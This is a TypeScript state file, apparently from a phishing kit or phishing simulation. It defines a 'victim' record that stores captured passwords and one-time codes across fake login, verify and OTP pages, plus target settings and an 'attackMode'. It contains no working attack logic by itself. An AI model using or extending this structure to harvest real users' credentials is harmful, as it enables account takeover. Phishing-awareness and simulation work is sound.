export interface AppState {
  victim: {
    email: string;
    name: string;
    profilePicture: string;
    passwords: string[];
    attempts: number;
    currentPage: 'email' | 'login' | 'password' | 'verify' | 'otp' | 'error' | 'redirect' | 'pwCatch';
    errorMessage: string;
    otp: string;
  };
  config: {
    redirectUrl: string;
    targetEmail: string;
    targetName: string;
    targetProfilePicture: string;
    attackMode: 'auto' | 'manual' | 'semi-auto';
  };
}

export const appState: AppState = {
  victim: {
    email: '',
    name: '',
    profilePicture: '',
    passwords: [],
    attempts: 0,
    currentPage: 'email',
    errorMessage: '',
    otp: '',
  },
  config: {
    redirectUrl: 'https://www.google.com/search?q=what+is+phishing',
    targetEmail: 'example@gmail.com',
    targetName: 'John Doe',
    targetProfilePicture: 'https://placehold.co/100x100.png',
    attackMode: 'auto',
  },
};

export const initialState: AppState = JSON.parse(JSON.stringify(appState));
